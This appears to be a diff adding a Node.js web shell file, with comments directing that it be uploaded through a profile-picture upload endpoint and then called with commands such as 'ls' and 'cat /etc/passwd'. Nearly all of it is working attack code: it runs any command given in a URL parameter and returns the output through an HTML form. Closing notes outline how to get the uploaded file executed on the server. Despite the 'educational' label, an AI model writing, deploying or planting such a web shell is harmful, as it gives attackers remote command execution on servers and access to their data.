@@ -1,0 +1,92 @@
+// EXAMPLE NODE.JS WEBSHELL - FOR EDUCATIONAL PURPOSES ONLY
+// Save this as 'webshell.js' and upload it via the profile picture upload
+// Then access it at /uploads/profile/webshell.js?cmd=ls
+
+// This is a simple Node.js webshell that allows remote command execution
+// When uploaded to the server, it can be accessed via URL with a cmd parameter
+// Example: /uploads/profile/webshell.js?cmd=ls
+// Example: /uploads/profile/webshell.js?cmd=cat%20/etc/passwd
+
+// Import required modules
+const http = require('http');
+const url = require('url');
+const { exec } = require('child_process');
+const path = require('path');
+
+// Create a server to handle requests
+http.createServer((req, res) => {
+  // Parse the URL to get query parameters
+  const queryObject = url.parse(req.url, true).query;
+  
+  // Set response headers
+  res.writeHead(200, {'Content-Type': 'text/html'});
+  
+  // Check if a command was provided
+  if (queryObject.cmd) {
+    // Execute the command and return the output
+    exec(queryObject.cmd, (error, stdout, stderr) => {
+      if (error) {
+        res.end(`
+          <html>
+            <head><title>WebShell</title></head>
+            <body>
+              <h1>Node.js WebShell</h1>
+              <h2>Error:</h2>
+              <pre>${error.message}</pre>
+              <h2>stderr:</h2>
+              <pre>${stderr}</pre>
+              <form method="GET">
+                <input type="text" name="cmd" placeholder="Enter command..." size="50" />
+                <input type="submit" value="Execute" />
+              </form>
+            </body>
+          </html>
+        `);
+        return;
+      }
+      
+      res.end(`
+        <html>
+          <head><title>WebShell</title></head>
+          <body>
+            <h1>Node.js WebShell</h1>
+            <h2>Command Output:</h2>
+            <pre>${stdout}</pre>
+            <form method="GET">
+              <input type="text" name="cmd" placeholder="Enter command..." size="50" />
+              <input type="submit" value="Execute" />
+            </form>
+          </body>
+        </html>
+      `);
+    });
+  } else {
+    // Display a simple form if no command was provided
+    res.end(`
+      <html>
+        <head><title>WebShell</title></head>
+        <body>
+          <h1>Node.js WebShell</h1>
+          <p>Enter a command to execute on the server:</p>
+          <form method="GET">
+            <input type="text" name="cmd" placeholder="Enter command..." size="50" />
+            <input type="submit" value="Execute" />
+          </form>
+        </body>
+      </html>
+    `);
+  }
+}).listen(0); // Listen on a random port
+
+// NOTE: This webshell will not work directly when uploaded as a .js file
+// through the profile picture endpoint, because the server won't execute it as a Node.js script.
+// However, this demonstrates the type of payload that could be uploaded through
+// the vulnerable endpoint.
+
+// A more realistic exploit would involve:
+// 1. Gaining initial access through the file upload
+// 2. Using vulnerabilities in the server configuration to execute the uploaded file
+// 3. Or modifying the server-side route handlers to execute the uploaded file
+
+// IMPORTANT: This is for educational purposes only.
+// Unauthorized use of such tools against real systems is illegal and unethical. 
